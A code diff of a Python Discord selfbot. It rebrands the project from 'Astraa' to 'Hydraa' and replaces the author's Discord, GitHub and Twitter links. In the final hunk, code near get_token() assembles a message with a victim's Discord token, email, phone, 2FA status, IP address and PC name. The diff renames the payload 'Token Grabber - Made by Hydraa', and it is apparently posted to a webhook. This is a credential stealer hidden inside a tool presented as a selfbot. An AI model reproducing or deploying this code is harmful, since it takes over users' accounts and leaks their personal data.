@@ -717,7 +717,7 @@ async def bots(ctx):
 async def help(ctx, category=None):
     await ctx.message.delete()
     if category is None:
-        embed = f"""**Astraa SelfBot | Prefix: `{Astraa.command_prefix}`**\n
+        embed = f"""**Hydraa SelfBot | Prefix: `{Astraa.command_prefix}`**\n
 > :pushpin: `GENERAL`\n*Shows all general commands* (like prefix, shutdown, ...)
 > :notepad_spiral: `USEFUL`\n*Shows all useful commands* (like tts, hastebin, nitro, ...)
 > :tools: `ATIO`\n*Shows all ATIO Tool commands* (like tokeninfo, serverinfo, ...)
@@ -964,10 +964,10 @@ async def shutdown(ctx):
 async def astraa(ctx):
     await ctx.message.delete()
     embed = f"""**MY SOCIAL NETWORKS | Prefix: `{Astraa.command_prefix}`**\n
-> :pager: `Discord Server`\n*https://dsc.gg/astraadev*
-> :computer: `GitHub Page`\n*https://github.com/AstraaDev*
-> :robot: `SelfBot Project`\n*https://github.com/AstraaDev/Discord-SelfBot*
-> :bird: `Twitter`\n*https://twitter.com/astraadev*"""
+> :pager: `Discord Server`\n*https://dsc.gg/hydrascripts*
+> :computer: `GitHub Page`\n*https://github.com/ErrorHere*
+> :robot: `SelfBot Project`\n*https://github.com/ErrorHere/Discord-SelfBot*
+> :bird: `Twitter`\n*https://twitter.com/BruhOfficial*"""
     await ctx.send(embed, file=discord.File("Images/astraa.gif"))
 
 #Clear channel messages
@@ -1491,8 +1491,8 @@ def get_token():
 > :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
 > :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
 > :shield: __Token__\n\t`{tok}`\n
-*Made by Astraa#6100* **|** ||https://github.com/astraadev||\"""
-                        payload = json.dumps({'content': embed, 'username': 'Token Grabber - Made by Astraa', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
+*Made by Deadless#8854* **|** ||https://github.com/errorhere||\"""
+                        payload = json.dumps({'content': embed, 'username': 'Token Grabber - Made by Hydraa', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
                         try:
                             headers2 = {
                                 'Content-Type': 'application/json',
